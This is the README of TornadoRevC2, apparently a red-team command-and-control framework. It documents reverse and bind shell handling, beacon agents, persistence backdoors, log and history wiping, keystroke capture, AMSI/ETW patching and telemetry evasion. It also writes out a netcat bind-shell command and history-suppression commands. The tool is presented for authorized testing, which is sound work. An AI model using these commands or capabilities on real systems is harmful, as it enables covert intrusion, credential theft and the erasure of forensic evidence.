# TornadoRevC2

A lightweight, modular post-exploitation framework for authorized security research, red-team operations, and penetration testing. TornadoRevC2 manages interactive reverse shell and bind shell sessions on Linux and Windows hosts through a unified operator console, across plain TCP, server-authenticated TLS, and mutually authenticated TLS transports. Core session handling is extended by a cross-platform plugin architecture for host enumeration, situational awareness, and operational tasks.

> **Important:** TornadoRevC2 runs two complementary session models in the same process. The **shell handler** prioritizes reliable interactive sessions, structured operator workflows, and on-demand plugin execution. The **beacon subsystem** adds a pull-based compiled agent for long-haul engagements that need scheduling, self-destruct, and network resilience rather than a live socket. Both share the operator console, TLS material, and logging infrastructure; neither requires the other. See [Beacon Subsystem](#beacon-subsystem).

---

## Legal Notice

Use this software only on systems you own or on systems where you have **explicit written authorization**. You are solely responsible for compliance with applicable laws and organizational policies. The authors and contributors accept no liability for misuse, data loss, or legal consequences arising from the use of this project.

---

## Demo

<p align="center">
  <img src="demo/TornadoRevC2-Demo.GIF" alt="TornadoRevC2 Demo" width="900">
</p>

<p align="center">
  <strong>Quick demo:</strong> session management, plugin execution, SOCKS5 pivoting.
</p>

---

## Table of Contents

- [Introduction](#introduction)
- [Key Features](#key-features)
- [Design Philosophy](#design-philosophy)
- [Operational Security](#operational-security)
- [Architecture](#architecture)
- [Requirements & Installation](#requirements--installation)
- [Quick Start](#quick-start)
- [Operator Reference](#operator-reference)
- [Built-in Plugins](#built-in-plugins)
- [Beacon Subsystem](#beacon-subsystem)
- [Plugin Development](#plugin-development)
- [Session Logging](#session-logging)
- [Project Structure](#project-structure)
- [TLS & mTLS Configuration](#tls--mtls-configuration)
- [License](#license)

---

## Introduction

TornadoRevC2 is a modular post-exploitation framework that supports two
session models in a single process, sharing one operator console and one
set of infrastructure components (TLS certificate material, malleable
profiles, session logging):

- **Interactive shell sessions** — reverse shells (target dials the
  handler over plain TCP, server-authenticated TLS, or mutual TLS with
  client-certificate verification) and bind shells (the handler dials
  the target, over plain TCP or TLS). Either can be moved at runtime
  onto an HTTPS secondary transport (HTTP/2 or HTTP/1.1 over TLS) or an
  SMB named pipe hosted on the target, and reverted with
  `backtoshell`. All flows produce identical session objects and pass
  through the same probe, plugin, transfer, and reporting pipeline.

- **Compiled beacon sessions** — a Go agent cross-compiled from the
  operator machine, with no runtime configuration on disk. The agent
  checks in on a schedule, retrieves queued tasks, executes them via
  in-process native handlers or a shell, and returns to sleep. Tasks
  and results are ECDSA-signed end to end, transport is HTTPS with
  optional mutual TLS, and every behavioural property is baked in at
  build time.

The framework provides a unified operator console for session
management, host reconnaissance, chunked file transfer, in-memory
payload execution, SOCKS5 pivoting, plugin-driven post-exploitation,
structured reporting, and a built-in `update` command for automatic
Git-based updates and seamless handler restarts. Capabilities such as
firewall enumeration, credential store metadata collection, network
mapping, browser profiling, Windows domain trust analysis, and
additional post-exploitation functionality are implemented as 65
independent, modular plugins. The `make_token` plugin establishes new
C2 sessions over remote protocols (SSH, WinRM, SMB, WMI, MSSQL, DCOM,
and MySQL/MariaDB) from the operator side; `upgrade_mtls` migrates a
live session onto the mutual-TLS listener by pushing the handler's
client certificate bundle to the target.

**Supported target platforms:** Linux and Windows (primary), with compatibility for generic Unix and BSD environments where applicable.

---

## Key Features

| Category | Capabilities |
|----------|-------------|
| **Session handling** | Multi-client TCP / TLS / mTLS listeners with automatic PKI bootstrapping · On-demand mTLS upgrade for live sessions · **Bind shell support** — dial a target listening on TCP or TLS · Interactive PTY/TTY shells · Session fingerprinting and reconnect tracking |
| **Secondary transport** | **HTTPS channel** — `http2switch <ID>` spawns an HTTP/2 or HTTP/1.1 agent on the target and flips the active transport; **SMB named pipe** — `smbswitch <ID>` deploys a C# pipe server on the target and attaches the handler as an SMB client; `backtoshell <ID>` closes whichever secondary transport is live and reverts; `transport <ID>` shows the live state of every channel · Dual-stack HTTPS listener negotiates h2 and http/1.1 via ALPN · Linux HTTP/2 agents run entirely in memory (`python3 -` via stdin) · Windows agents run in `Start-Job`; Linux agents in their own `setsid` session group · Domain fronting / redirector support via `--front-domain` · Bind interface can be an IP or an interface name (`tun0`, `eth0`); auto-detected when omitted |
| **Operational security** | Shell history suppression on Linux and Windows · No `pty.spawn` or `Invoke-Expression` in command paths · Session-scoped probe markers · Randomised per-session identity strings (shell variables, launch markers, HMAC key) · **Command obfuscation** — per-session XOR+base64 wrapper installed in bash/zsh/PowerShell, so plaintext commands never reach shell history, `ps`, Sysmon EventID 1, or auditd · **In-process execution** — Linux HTTP/2 agents serve `cat`, `ls`, `env`, `ps`, `pwd`, `whoami`, `id`, `hostname`, `uname` without spawning a child process · HMAC-signed HTTP/2 tokens (`/c2/<token>?s=<hmac>`) · TLS session tickets · HTTPS keepalive (PING) and null-byte frame padding · Configurable connect-time jitter (default 0.3–1.5 s; `TORNADO_CONNECT_DELAY` override) · Per-agent kill date / self-destruct (`TORNADO_KILL_DAYS`, default 30) · No log or staging file written to the target during Linux HTTP/2 delivery · **ECDSA command signing** for Windows HTTP/2 agents · PTY upgrade verification |
| **File transfer** | Chunked upload with resume · Chunked download with resume · SHA-256 integrity verification · Optional HTTPS transport for upload (`--https`) and push-style download (`--https-push`), with target-interface binding and callback address override |
| **Payload execution** | In-memory execution for `py`, `ps`, `exe`, `elf`, `bat`, and `sh` — with memfd-based ELF execution (modern and legacy fallbacks) and subsystem-aware PE loading |
| **Pivoting & tunneling** | SOCKS5 proxy through compromised sessions · Windows tunnel agent runs in-memory (C#, no disk artifact); Unix uses a Python agent under `/tmp` · `socks test` requires an already-running proxy and does not deploy the agent implicitly · Soft and hard tunnel reset (`socks reset [--hard]`) · Automatic remote agent cleanup on `socks stop` and session disconnect · Ligolo-NG and Chisel agent deployment with background persistence |
| **Remote session establishment** | `make_token` — establish new sessions over SSH, WinRM, SMB, WMI, MSSQL, DCOM, or MySQL/MariaDB from the operator side, with password / NTLM-hash / SSH-key / WinRM-client-certificate authentication, MySQL UDF auto-loading, custom-command execution, and netexec integration |
| **Impersonation** | `runas` — execute commands or spawn a TLS-encrypted shell as another user, local or remote, with domain support and netexec integration · `steal_token` — list processes and owners, impersonate another process's token, or spawn a cmd / reverse shell running as the token owner |
| **Token privileges** | `enablepriv` — enable, disable, list, or toggle every privilege on the current Windows token via in-memory C# (`AdjustTokenPrivileges`), with `--list` / `--list-all` / `--all` modes |
| **Enumeration** | Covering host triage, detection-environment preflight, network posture, credentials and browser metadata, Kerberos tickets, Linux internals (sudo configuration, writable filesystem targets, restricted-shell detection), Windows domain trusts, WMI persistence, loaded modules, and Windows domain and system configuration |
| **Operational plugins** | Multi-pass secure file wiping · Hybrid file encryption · Shell history clearing · Windows event log clearing · Cross-platform keystroke capture with window context |
| **Persistence** | Cross-platform backdoor installation using TLS-encrypted payloads — cron `@reboot` on Linux/Unix, Run registry on Windows |
| **Extensibility** | Runtime plugin load, reload, unload, and rescan (live discovery — no handler restart) · External plugins via `TORNADOREVC2_PLUGIN_DIR` · Documented `SessionContext` API |
| **Reporting** | Per-session logging · Structured plugin output · HTML transcript export |
| **Self-update** | Git-based `update` command with repository verification, fast-forward pull, and automatic handler restart |
| **Beacon subsystem** | Compiled Go agent, cross-compiled from the operator machine · HTTPS / mTLS transport · uTLS browser ClientHello fingerprinting (`chrome`, `firefox`, `safari`) · ECDSA P-256 task and result signing with trust-on-first-use public key pinning · Cookie-based session tokens with HMAC proof · Native in-process verbs (`cat`, `ls`, `ps`, `id`, `env`, `pwd`, `whoami`, `hostname`, `uname`) with no `fork` or `execve` · **Chunked file transfer** with SHA-256 verification · **In-memory PE (Windows) and ELF (Linux) execution** · **BOF/COFF loading** on Windows via an embedded C# loader shared with the shell handler's `bofloader` plugin · **Inline script execution** (`pyexec`, `psexec`, `shexec`) with source piped via stdin · Compile-time OPSEC profiles (anti-sandbox, anti-debug, anti-VM, AMSI/ETW patching, string obfuscation, garble, UPX) · Named C2 profiles for HTTP fingerprinting · Runtime-configurable sleep and working-hours · Automatic reconnection on 4xx/5xx · Kill date / self-destruct · Background session reaper · Response padding to random buckets · Interactive `beacon-build` wizard |

**Not supported:** Scheduled task management on the target, or beacon-side plugin compatibility with the shell handler's `@plugin.command` registry.


---

## Design Philosophy

TornadoRevC2 is engineered for environments where deployment friction
and operational footprint matter. The shell handler and the beacon
subsystem share this principle but realize it differently: the shell
handler avoids artifacts by relying on shell primitives that are
already present; the beacon avoids them by shipping a self-contained
binary with no external configuration.

### Dependency-light, native-command design

Plugins leverage **native Windows and Linux utilities and built-in system commands** already present on the target host—`netsh`, `ss`, `iptables`, `ufw`, `firewall-cmd`, `nft`, PowerShell cmdlets, `nmcli`, `wevtutil`, and others. Collectors invoke these tools through the reverse shell channel and parse output remotely, minimizing the need to upload additional binaries or install dependencies.

### Enumeration without artifact drops

**Enumeration plugins execute through the existing reverse shell channel and do not drop binaries, scripts, or temporary files for reconnaissance.** Native commands, inline Python collectors, and in-process PowerShell scripts return structured JSON over the shell. The only unavoidable artifact is normal command history generated by the shell itself — which TornadoRevC2 suppresses at session start (see [Operational Security](#operational-security)).

Operational plugins intentionally place artifacts on the target and document their own cleanup behavior:

- `ligolong` / `chisel` — deploy tunneling agents with background persistence.
- `persistence` — installs a reverse shell backdoor (cron `@reboot` / Run registry).
- `upgrade_mtls` — pushes `client.pem`, `client.key`, and `ca.pem` to the target (removed by default once the new mTLS session is up).
- SOCKS5 pivoting — on Windows, the tunnel agent is compiled in-memory from C# via `Add-Type` inside a detached PowerShell child; no file is written to disk. On Linux/Unix, a Python agent is staged under `/tmp`. In both cases the remote agent is torn down automatically on `socks stop` (when it was the last proxy for the session) and on session disconnect. On Unix, the `/tmp/.tornado_agent_*.py` file is deleted as part of that cleanup.
- Bind shell sessions — no artifact is placed on the target by the handler. The target already runs the listener; the handler only connects and manages the session.

### Command obfuscation

Every session that supports an in-process decoder (bash, zsh, PowerShell) receives a per-session decoder at session start. From that point, every command the operator types — or that a plugin emits through `session.run_shell()` — is wrapped as `_r '<base64(xor(cmd))>'` before it hits the wire. The shell sees a single decode-and-execute call; the plaintext command never appears in shell history, `ps auxww`, `Sysmon EventID 1`, or `auditd` `execve` telemetry.

The XOR key is 32 bytes from `secrets.token_bytes()`, fresh per session, and is never written to disk. cmd.exe sessions skip the layer — cmd has no in-process decoder primitive, and shimming each command through a separate PowerShell process would add a process-spawn signature that outweighs the benefit.

### In-process execution (Linux HTTP/2 agents)

When a Linux target is running the HTTP/2 secondary transport, a set of common read operations execute inside the Python agent instead of a spawned child process. The handler routes matching commands transparently — plugins do not need to know whether the routing happened:

| Command shape | Served by |
|---|---|
| `cat <path>` | `os.read()` in the agent |
| `ls [path]` | `os.listdir()` + `os.stat()` in the agent |
| `env` / `printenv` | `os.environ` in the agent |
| `ps auxww` / `ps -ef` | `/proc` walk in the agent |
| `pwd` / `whoami` / `id` | `os.getcwd()` / `pwd` / `os.getuid()` |
| `hostname` / `uname` | `socket.gethostname()` / `os.uname()` |

Anything outside this set — pipes, redirects, external binaries, multi-line scripts — falls through to the shell exactly as before. The routing layer is entirely inside the handler; plugin code is unchanged. The net effect is roughly a third of plugin-spawned child processes eliminated on Linux HTTP/2 sessions.

### Graceful degradation

When an enumeration routine fails, is unavailable, or times out, the plugin does not abort entirely. The affected section is left empty or marked `N/A` while the remainder of the report continues.

### Operator-side maintenance

Handler updates are delivered through Git on the operator machine. The `update` command uses bounded subprocess timeouts, non-interactive Git settings, and a fast local shutdown path so the handler can restart reliably without waiting for remote session cleanup to complete.

---

## Operational Security

TornadoRevC2 applies a set of always-on operational security measures across every session. These are not optional flags — they run unconditionally so that even a hurried operator receives the full benefit.

### Operational security (beacon)

- **ECDSA P-256 signing** on every task (server → agent) and every
  result (agent → server), with trust-on-first-use pinning per session.
- **Cookie-based session tokens** with HMAC proof. No custom `X-`
  headers, no enumerable integer IDs.
- **Response padding.** Both `/beacon` and `/tasks` responses are
  padded to a random size, so Content-Length does not correlate with
  task activity.
- **Jittered first check-in.** The initial beacon fires 2–17 seconds
  after launch, matching the latency of a user-initiated app.
- **Working-hours window.** Configurable via build flags; defaults to
  08:00–19:00 local time.
- **Native in-process execution** for `cat`, `ls`, `ps`, `id`, `env`,
  `pwd`, `whoami`, `hostname`, `uname` — no `fork`, no `execve`.
- **Command obfuscation via stdin-piped shells.** Arbitrary commands
  travel via stdin to `/bin/sh -s` (Linux) or `cmd.exe /Q` (Windows);
  the actual command never appears in argv.
- **Shell history suppression.** Any child shell inherits
  `HISTFILE=/dev/null`, `HISTSIZE=0`, `HISTCONTROL=ignorespace`,
  `HISTIGNORE=*`.
- **Compile-time OPSEC profiles.** `stealth`, `opsec`, and `paranoid`
  bundle anti-sandbox, anti-debug, anti-VM, AMSI/ETW patching, string
  obfuscation, garble, and UPX.


### Shell history suppression

Every session neutralizes its own command history before doing anything else.

**Linux/Unix** — the PTY upgrade path unsets `HISTFILE`, points it at `/dev/null`, zeroes `HISTSIZE` and `HISTFILESIZE`, sets `HISTCONTROL=ignorespace`, and disables the shell's history via `set +o history`. Every subsequent command is space-prefixed where `ignorespace` is honored. Result: `~/.bash_history` receives nothing from the session.

**Windows** — on session init, the handler runs:

```powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
```

Result: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` receives nothing from the session.

### Command construction discipline

The handler and its plugins avoid command patterns that are widely known as red-team signatures.

- **No `python -c 'import pty; pty.spawn(...)'`.** The PTY upgrade path prefers `socat` when available and otherwise uses `script -qfc` (util-linux) or `script -q /dev/null` (BSD/macOS), all of which are legitimate sysadmin utilities. `pty.spawn` is not. After the upgrade, the handler verifies the session is running bash; if the shell swap failed, `pty` is marked `False` so downstream code does not assume interactive behaviour.
- **No `Invoke-Expression` (IEX).** PowerShell scripts are either sent inline (for short single statements) or wrapped in `[ScriptBlock]::Create(...).Invoke()`. When the payload is too large for a single command line, it is staged to a plausibly-named temp file under `%TEMP%`, executed with `-File`, and deleted immediately.
- **No static probe markers.** The platform and identity probes use per-session randomized markers, so no fixed string appears in command logs or process-creation telemetry.

### Jitter between automated commands

Plugin collectors insert a random 0.5–2.5 s delay at the start of each run and between fallback probes. This breaks the tight command-burst pattern that defenders associate with automated tooling.

### Session log hygiene

Session logs are written through an error-safe path (logging failures never abort a session) and ANSI/OSC/DCS terminal control sequences are stripped from target output so logs remain readable in any editor. Operator commands are stored verbatim.

### PTY verification

The PTY upgrade is verified after send. If the shell swap to bash fails silently — as it does on some Debian-family distributions under `script -qfc` — the handler runs a marker-wrapped `tty` probe and only marks the session as PTY-backed when a real `/dev/pts/*` is attached. Otherwise the session stays in the original shell, and the fallback path (`/bin/bash --noprofile --norc -i`) runs instead. This prevents the "session says PTY, but plugins silently truncate on long command lines" failure mode.

### Randomised per-session identifiers

Every operator-visible string emitted during a session is derived from `secrets.token_hex` at delivery time. Session probe markers, the shell variable name used to stage the Linux HTTP/2 agent, the launch marker echoed back after delivery, and the handler's per-run HMAC key are all different on every session. No fixed string ends up in command logs or process-creation telemetry.

### HMAC-signed HTTP/2 tokens

Every HTTP/2 and HTTP/1.1 callback carries a token proof: `/c2/<token>?s=<hmac>` where the HMAC is computed by the handler with a per-run secret key. The listener verifies the proof before attaching the stream to a session. Token enumeration alone does not hijack an existing session.

### TLS session tickets

All three TLS contexts (TLS, mTLS, HTTPS secondary) enable session tickets (`OP_NO_TICKET` cleared, `num_tickets = 4`) so clients can resume connections across reconnects. This matches the behaviour of real browsers and reduces full-handshake telemetry on repeated connections.

### HTTP/2 traffic shaping

HTTP/2 agents send a jittered PING every 30–45 s and terminate themselves if no PING ack arrives within 90 s — matching the keepalive pattern real browsers use. Short outbound frames are padded with null bytes to a randomised size (512 / 1024 / 2048 / 4096), so the wire pattern no longer correlates directly to shell command/output sizes. The server strips the padding before feeding data to the shell.

### Command obfuscation (per-session XOR+base64)

Every bash, zsh, and PowerShell session receives a one-line decoder function (`_r`) at session start. All operator input and all plugin commands sent through `send_to_revshell` are wrapped as `_r '<base64(xor(cmd))>'`. The plaintext command never appears in shell history, `ps auxww`, Sysmon EventID 1, or auditd `SYSCALL.execve`. The XOR key is a fresh 32-byte value per session. cmd.exe sessions skip the layer.

### ECDSA command signing (Windows HTTP/2 agents)

Every Windows HTTP/2 agent embeds an ECDSA P-256 public key at build time. All commands sent to that agent's bridge are signed by the handler with the corresponding private key and verified by the agent before being forwarded to `cmd.exe`. Unsigned or mis-signed commands are silently dropped. Coverage is limited to the Windows HTTP/2 bridge — the primary shell channel, Linux agents, and SMB pipes do not yet verify signatures.

### In-process execution (Linux HTTP/2 agents)

The Linux HTTP/2 agent carries an in-process dispatcher for `__rd`, `__ls`, `__env`, `__ps`, `__pwd`, `__whoami`, `__id`, `__hostname`, and `__uname`. The handler routes matching shell commands (`cat`, `ls`, `env`, `ps`, `pwd`, `whoami`, `id`, `hostname`, `uname`) onto these verbs automatically. No `subprocess.Popen`, no `execve`, no Sysmon/auditd event for the read itself.

### Malleable profile

A JSON profile (`--profile <path>`) parameterises the HTTP fingerprint of every HTTPS agent: URI pattern (`uri_pattern` with `{token}` and `{proof}` placeholders), User-Agent (`user_agent`, `linux_user_agent`), and extra HTTP/1.1 headers. Missing keys fall back to built-in defaults. The profile is read at handler start and substituted into the target-side agent templates.

### Connect-time jitter

The handler waits a randomised 0.3–1.5 s interval between accepting an inbound connection and sending the first probe. This keeps N simultaneous shells finishing identification at roughly the same wall-clock time while still breaking the "three shells within 200 ms" signature. Override with `TORNADO_CONNECT_DELAY="<low>:<high>"` (seconds, e.g. `TORNADO_CONNECT_DELAY="5:30"` for a lab-to-production stagger).

### Kill date / self-destruct

Every HTTP/2 and HTTP/1.1 agent embeds an absolute Unix-epoch kill deadline computed at delivery time from `TORNADO_KILL_DAYS` (default `30`). Past that instant the agent terminates itself unconditionally — no operator interaction required — and the connection is dropped cleanly. The Windows agent enforces this in a background runspace; the Linux agent enforces it in a dedicated watchdog thread.

### No on-target log or staging file (Linux HTTP/2 delivery)

The Linux HTTP/2 agent is delivered entirely in memory: the source is base64-encoded into a shell variable across PTY-safe chunks, decoded, and piped straight into `python3 -` via stdin. Nothing touches disk, not even transiently. The agent's own `_log()` is a no-op — there is no `/tmp/.t_agent.log`, no staging file, no post-run artefact.

### What this layer does not claim

TornadoRevC2 does **not** claim to evade EDR, AMSI, ScriptBlock logging, or memory forensics. The architecture (reverse/bind-shell channel based post exploitation framework, no compiled implant) has a hard ceiling on what is possible. The measures above reduce forensic footprint and operational risk; they do not make the tool undetectable on a monitored host. Operators should treat every session as potentially observable and follow engagement-specific rules of engagement.

---

## Architecture

```text
┌─────────────────────────────────────────────────────────────────┐
│                     Operator Console (handler)                  │
│  Sessions · Transfers · SOCKS · Plugins · Logging · Export ·    │
│  transport switching · update                                   │
└──────────┬──────────────────┬───────────────────┬───────────────┘
           │                  │                     │
  REVERSE  TCP/TLS/mTLS   BIND  TCP/TLS      HTTPS  h2 or http/1.1   SMB  named pipe
  target ──► handler    handler ──► target  (switchable, same session)  (switchable, same session)
           │                  │                   │
           └──────────┬───────┴───────────────────┘
                      │  (all directions produce
                      │   identical session objects)
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                        Target Host                              │
│  Native commands · PowerShell · inline collectors               │
│  __T_PLUGIN_START__ + JSON + __T_PLUGIN_END__                   │
└─────────────────────────────────────────────────────────────────┘
```

### Listener Configuration

TornadoRevC2 runs **three independent listeners simultaneously**, so implants can connect over plaintext, server-authenticated TLS, or mutually authenticated TLS depending on the engagement's threat model:

| Listener | Default port | Flag | Authentication | Certificates |
|----------|--------------|------|----------------|--------------|
| TCP      | `4444`       | `-p`  | None           | None |
| TLS      | `8443`       | `-tp` | Server-authenticated | `tls_certs/server.pem`, `tls_certs/server.key` |
| mTLS     | `9443`       | `-mp` | Mutual (client cert required) | `mtls_certs/` bundle (CA + server + client) |
| HTTPS    | *(disabled)* | `--h2-port` | Server-authenticated (target skips verify) | Reuses `tls_certs/server.pem` and `server.key` |
| SMB      | target `445` | `smbswitch` | Negotiated by `smbprotocol` on the handler side | None (uses target credentials) |

The `-H` flag sets the bind address shared by all listeners. All four can be enabled at once; disabling one is not currently required — leave the port free or unbound to ignore it.

The **HTTPS listener** is opt-in and only started when `--h2-port` is passed. It terminates HTTP/2 and HTTP/1.1 over TLS in one context; ALPN decides which. It is not a reverse-shell listener — it accepts only `POST /c2/<token>`, where `<token>` matches a session the operator has already switched with `http2switch`. See [Transport switching](#transport-switching).

The three listeners handle inbound **reverse shells**. **Bind shells** use the opposite flow — the handler dials a target that is already listening. They are initiated from the main handler prompt with `bind <host> <port>`, over plain TCP or TLS. Bind shell sessions use the same `handle_client` code path as reverse shells, so probes, plugins, file transfers, SOCKS pivoting, and logging all work identically without additional setup. Only the direction flag differs, and it is displayed in `status`.

**Automatic certificate generation.** On first launch the handler creates two isolated directories and bootstraps the material it needs:

```text
tls_certs/
  server.pem          # self-signed server certificate
  server.key          # server private key

mtls_certs/
  ca.pem              # mTLS certificate authority (self-signed, 4096-bit RSA)
  ca.key              # CA private key
  ca.srl              # OpenSSL serial counter (auto-generated)
  server-mtls.pem     # server cert signed by CA
  server-mtls.key     # server private key
  client.pem          # client cert signed by CA — ship to implant
  client.key          # client private key  — ship to implant
```

The bootstrap is **all-or-nothing per bundle**: if every expected file for a bundle already exists, generation is skipped; if any single file is missing, the entire bundle is regenerated. This means deleting one file from `mtls_certs/` invalidates the existing trust chain — remove the whole directory if you want a clean rebuild. If OpenSSL is not on `PATH`, the handler exits during first-run certificate generation.

### Plugin Layout

```text
tornadorevc2/plugins/
  shared/     Cross-platform plugins with internal Windows/Linux implementations
  linux/      Linux/Unix-only plugins and collector builders
  windows/    Windows-only plugins (rdp, services, eventlogdel, …)
  api.py      SessionContext and @plugin.command registration
  manager.py  Runtime loading, execution, and platform filtering
  loader.py   Automatic module discovery
```

**Shared plugins** (`firewall`, `ports`, `browser`, `credstore`, and others) exist as single unified modules in `shared/`. **Platform-specific plugins** such as `rdp` and `eventlogdel` reside exclusively under `windows/` or `linux/` and are not duplicated in `shared/`.

Collectors emit JSON wrapped in marker tokens (`__T_PLUGIN_START__` / `__T_PLUGIN_END__`). The shared runner parses this output, formats an operator-facing report, and persists results under the session log directory.

### SOCKS5 pivoting lifecycle

Each SOCKS proxy runs through a remote tunnel agent that connects back to the handler over a dedicated tunnel listener (default: `revshell_port + 1`) and maintains a pool of channels for stream multiplexing.

Agent transport by platform:

- **Windows** — C# agent compiled in-memory with `Add-Type` inside a detached PowerShell child. No disk artifact is created. Cleanup terminates the child by its `TNB_<token>` process marker.
- **Linux/Unix** — Python agent staged under `/tmp/.tornado_agent_<token>.py` and executed via the interpreter discovered on the target (Python 3 preferred, Python 2 fallback). Cleanup removes both the process and the script file.

The operator controls the tunnel with four commands:

- `socks <listen_port>` — start a SOCKS5 proxy bound to `127.0.0.1:<listen_port>`
- `socks test <host> <port>` — verify TCP reachability through an **already-running** proxy. Does not deploy the agent implicitly; if no proxy exists for the session, the command prints how to start one and returns.
- `socks reset [--hard]` — soft reset (abort relays, purge remote streams, clear buffers, rebalance channels) or hard reset (kill and redeploy the agent for a fully fresh state)
- `socks stop <proxy_id>` — stop a proxy; if it was the last proxy on the session, the remote agent is terminated and any on-disk artifact (Unix only) is removed from the target

The agent is **shared across proxies on the same session** and is cleaned up only when the last proxy on that session stops or the session disconnects.

### Beacon listener

The beacon subsystem runs on a **dedicated port** (`--beacon-port`),
separate from the shell listeners, and terminates TLS itself. It reuses
the handler's certificate material and accepts three endpoints:
`POST /beacon` (check-in), `GET /tasks` (poll), `POST /results`
(result upload). ALPN advertises only `http/1.1` because Werkzeug
cannot parse the HTTP/2 connection preface.

C2 profile paths under `profiles/c2/` are **auto-discovered at listener
startup**: every unique path declared by any profile is registered as a
valid route. An agent built with `--c2-profile chrome` reaches a
listener started without any matching flag. `--beacon-profile <name>`
narrows registration to a single profile's paths.

The beacon engine (`tornadorevc2/beacon/engine.py`) holds the single
source of truth for beacon session state. A background thread reaps
sessions that have been silent for 100× their normal TTL. A task queue
per session is drained on each `/tasks` poll; scheduling parameters are
pushed back as response headers so `sleep` changes in the console take
effect within one interval.


---

## Requirements & Installation

**Handler (operator machine):**

- Python 3.7 or later
- OpenSSL (for automatic TLS and mTLS certificate generation)
- Git (optional; required for the `update` operator command)
- `h2` (`pip install h2`) — required for the HTTP/2 secondary listener
- `smbprotocol` (`pip install smbprotocol`) — required for the SMB named-pipe secondary transport
- No other third-party Python packages required

**Environment variables (all optional):**

| Variable | Default | Effect |
|----------|---------|--------|
| `TORNADO_KILL_DAYS` | `30` | Days after which every delivered agent self-destructs |
| `TORNADO_CONNECT_DELAY` | `0.3:1.5` | `low:high` range (seconds) for the pre-probe jitter. Set `5:30` or wider for OPSEC-heavy engagements |
| `TORNADOREVC2_PLUGIN_DIR` | *(unset)* | External plugin search directory |

```bash
git clone https://github.com/kamalx06/TornadoRevC2.git
cd TornadoRevC2
python3 tornadorevc2.py
```

---

## Quick Start

### 1. Start the handler

```bash
# Default: TCP on 4444, TLS on 8443, mTLS on 9443
python tornadorevc2.py

# Custom bind address and ports for all three listeners
python tornadorevc2.py -H 0.0.0.0 -p 4444 -tp 8443 -mp 9443

# Point to your own certificate material
python tornadorevc2.py \
  -c tls_certs/server.pem -k tls_certs/server.key \
  --mtls-ca-cert mtls_certs/ca.pem --mtls-ca-key mtls_certs/ca.key \
  --mtls-server-cert mtls_certs/server-mtls.pem --mtls-server-key mtls_certs/server-mtls.key \
  --mtls-client-cert mtls_certs/client.pem --mtls-client-key mtls_certs/client.key
```

### 2. Establish a session

Two ways to get a session:

**Reverse shell** — deploy a payload from the built-in catalog (`payloads`) or use your own implant. The target connects to one of the three listeners (Defaults: TCP `4444`, TLS `8443`, mTLS `9443`).

**Bind shell** — the target runs a listener (for example `nc -lvnp 4444 -e /bin/bash` or `ncat --ssl -lvnp 4444 -e /bin/bash`). From the handler prompt:

```bash
bind 10.10.14.7 4444              # plaintext bind
bind 10.10.14.7 4444 --tls        # TLS-wrapped bind

### 3. Operate

```bash
status                            # List active sessions
switch 1                          # Attach to session 1
sysinfo 1                         # Collect host metadata
run credstore 1                   # Credential store metadata
run memorymap 1 1234              # Process memory maps (requires PID)
run inmemory 1 sh ./linpeas.sh    # In-memory script execution
run upgrade_mtls 1 --port 9443    # Migrate session to the mTLS listener
http2switch 1                     # Switch session 1 to the HTTPS secondary channel
smbswitch 1 --pipe lsarpc3f       # Switch session 1 to an SMB named-pipe channel (Windows)
transport 1                       # Show which channel is active
backtoshell 1                     # Close whichever secondary channel is live, revert to the shell
upload --https eth0 1 ./tool "C:\Temp\tool.exe"       # HTTPS upload
download --https-push 1 /var/log/auth.log ./auth.log  # HTTPS push download
update                            # Pull latest from GitHub and restart (Git installs)
```

When attached via `switch <ID>`, omit the session ID from subsequent commands (`run quickenum` instead of `run quickenum 1`). Plugin listings and TAB completion inside a client session are filtered to plugins compatible with that session's platform.

The `update` command is available from the main handler prompt only. It verifies that Git is installed, confirms the installation is a Git working tree, fetches from the configured remote, fast-forward pulls when updates exist, and restarts the handler with the same executable and arguments. If the installation is already current, it prints `TornadoRevC2 is already running the latest version.` and leaves the server running.

---

## Operator Reference

### Session management

| Command | Description |
|---------|-------------|
| `status` / `ls` | List active sessions (reverse and bind). The transport and direction are shown examples — `TCP/REV`, `TLS/REV`, `TCP/BIND`, `TLS/BIND`. |
| `sessions` | Show tracked sessions, including disconnected hosts |
| `reconnects` | Display session reconnect history |
| `switch <ID>` | Attach to an interactive session shell |
| `kill <ID>` | Terminate a session |
| `rename <ID> <name>` / `rn <ID> <name>` | Assign a friendly name |
| `sysinfo <ID> [--stealth\|--full]` | Collect or refresh host information |
| `export <ID>` | Export an HTML session transcript |

### Transport switching

A session's primary channel is the reverse or bind shell. HTTP/2 and HTTP/1.1 are optional **secondary** channels that carry the same commands and output, over a dedicated TLS listener. The primary channel is never torn down during a switch; both stay attached to the same logical session, and the operator chooses which carries commands with two commands.

| Command | In-session form | Description |
|---------|-----------------|-------------|
| `http2switch <ID> [--rh <ip\|iface>]` | `http2switch [--rh <ip\|iface>]` | Spawn the HTTPS agent on the target and flip the active transport. If `--rh` is omitted the handler asks the kernel which local address reaches the target, then falls back to the session's local endpoint. `--rh` accepts an IPv4 address or an interface name (`tun0`, `eth0`). |
| `smbswitch <ID> [--pipe <name>] [--user <u>] [--pass <p>] [--domain <d>]` | `smbswitch` | Deploy a C# named-pipe server (`\\.\pipe\<name>`) on a Windows target and attach the handler as an SMB client over TCP 445. The pipe name is randomised when omitted. Credentials default to the current logon context; on failure the handler falls back to the same-host HTTPS channel. |
| `smblateral <A_ID> <B_host> <B_pipe> [--user <u>] [--pass <p>] [--domain <d>]` | — | Open a lateral channel: session A deploys a C# forwarder that bridges the handler to host B's named pipe. A new session object is created, tagged `LATERAL(via #A)`, and behaves like any other session — plugins, transfers, and `kill` all work through it. A's forwarder job is stopped automatically when the lateral session is torn down. |
| `backtoshell <ID>` | `backtoshell` | Close whichever secondary transport is currently active (SMB preferred, HTTPS fallback) and revert to the shell. |
| `transport <ID>` | `transport` | Print the current active transport and the alive/dead state of every channel (shell, http2, smb), including the peer address of the last send. |

**Agent selection is automatic** based on a preflight probe of the target:

| Target | Agent |
|--------|-------|
| Windows, PowerShell 7+ | HTTP/2 via `HttpClient` inside a `Start-Job` |
| Windows, PowerShell 5.x | HTTP/1.1 chunked via `HttpWebRequest` inside a `Start-Job` |
| Linux / Unix with `python3` | Python `h2` agent, `pip install --user` if the library is missing |
| Linux / Unix without `h2` and without pip | Python agent falls back to a stdlib-only HTTP/1.1 chunked transport |

